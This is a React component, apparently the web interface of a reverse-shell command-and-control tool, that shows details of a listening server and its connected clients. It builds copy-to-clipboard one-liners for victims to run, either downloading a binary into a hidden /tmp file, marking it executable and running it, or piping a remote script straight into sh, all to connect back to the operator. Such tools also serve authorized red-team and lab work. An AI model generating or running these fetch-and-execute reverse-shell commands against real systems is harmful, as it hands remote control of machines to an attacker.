import React from "react";
import { CopyToClipboard } from "react-copy-to-clipboard";
import { Alert, Collapse, Descriptions, Input, List, Tabs, Tag } from "antd";

const { TabPane } = Tabs;
const { Panel } = Collapse;
var randomstring = require("randomstring");
const moment = require("moment");

export default class Hint extends React.Component {
  render() {

    let hint;
    if (this.props.currentServer === null) {
      hint = (
        <Alert
          message="Warning"
          description="Please start and select a server"
          type="warning"
          showIcon
          closable
        />
      );
    } else {
      let hintTabs
      let public_ip = this.props.currentServer.public_ip
      if (this.props.currentServer.encrypted) {
        let interfaces = [...this.props.distributor.interfaces];
        if (public_ip) {
          interfaces.unshift(public_ip)
        }
        hintTabs = <Tabs defaultActiveKey="0">
          {interfaces.map((value, index) => {
            let url = "http://" + value + ":" + this.props.distributor.port
            let command, filename, target
            let data = []
            Object.values(interfaces).map((value, index) => {
              filename = "/tmp/." + randomstring.generate(4)
              target = value + ":" + this.props.currentServer.port
              command = "curl -fsSL " + url + "/termite/" + target + " -o " + filename + " && chmod +x " + filename + " && " + filename
              data.push({ target: value + ":" + this.props.currentServer.port, command: command })
              return command
            })

            let commands = <List
              size="small"
              header={<div>Termite oneline command</div>}
              footer={<div></div>}
              bordered
              dataSource={data}
              renderItem={item => <List.Item>
                {"Connect back: " + item.target}
                <Input addonAfter={<CopyToClipboard
                  text={item.command}
                  onCopy={() => this.props.setCopied()}
                >
                  <button>Click to copy</button>
                </CopyToClipboard>
                } defaultValue={item.command} />
              </List.Item>}
            />

            return (
              <TabPane tab={value} key={index}>
                {commands}
              </TabPane>
            );
          })}
        </Tabs>
      } else {
        let interfaces = [...this.props.currentServer.interfaces];
        if (public_ip) {
          interfaces.unshift(public_ip)
        }
        hintTabs = <Tabs defaultActiveKey="0">
          {interfaces.map((value, index) => {
            let command = "curl http://" + value + ":" + this.props.currentServer.port + "|sh"
            return (
              <TabPane tab={value} key={index}>
                <Tag>{command}</Tag>
                <CopyToClipboard
                  text={command}
                  onCopy={() => this.props.setCopied()}
                >
                  <button>Click to copy</button>
                </CopyToClipboard>
              </TabPane>
            );
          })}
        </Tabs>
      }
      hint = (
        <div>
          <Descriptions title="Server Info">
            <Descriptions.Item label="Address">
              {this.props.currentServer.host +
                ":" +
                this.props.currentServer.port}
            </Descriptions.Item>
            <Descriptions.Item label="Clients">
              {this.props.currentServer
                ? Object.keys(this.props.currentServer.clients).length + Object.keys(this.props.currentServer.termite_clients).length
                : 0}
            </Descriptions.Item>
            <Descriptions.Item label="Started">
              {moment(this.props.currentServer.timestamp).fromNow()}
            </Descriptions.Item>
          </Descriptions>
          <Collapse defaultActiveKey={["1"]}>
            <Panel
              header="Expand to show the reverse shell commands for the current server"
              key="1"
            >
              {hintTabs}
            </Panel>
          </Collapse>
        </div>
      );
    }
    return hint;
  }
}
